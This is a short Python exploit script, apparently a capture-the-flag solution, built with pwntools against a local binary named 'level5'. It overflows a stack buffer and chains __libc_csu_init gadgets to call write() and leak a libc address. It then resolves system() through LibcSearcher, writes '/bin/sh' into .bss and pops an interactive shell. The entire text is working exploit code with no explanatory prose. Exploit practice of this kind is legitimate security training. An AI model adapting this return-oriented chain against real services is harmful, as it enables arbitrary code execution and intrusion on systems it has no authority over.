from pwn import *
from pwnlib.util.packing import p64, u64
from LibcSearcher3 import LibcSearcher

level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
CSU_FRONT_ADDR = 0x00400600
CSU_END_ADDR = 0x0040061A
FAKE_EBP = b'b' * 8


def csu(rbx: int, rbp: int, r12: int, r13: int, r14: int, r15: int, last: int):
    payload = b'a' * 0x80 + FAKE_EBP
    payload += p64(CSU_END_ADDR) + p64(rbx) + p64(rbp) + \
        p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(CSU_FRONT_ADDR)
    payload += b'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil(b'Hello, World\n')
# write(1, write_got, 8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
log.success('system_addr ' + hex(system_addr))

sh.recvuntil(b'Hello, World\n')
# read(0, bss_base, 16)
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(system_addr) + b'/bin/sh\x00')

sh.recvuntil(b'Hello, World\n')
# system(bss_base + 8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()
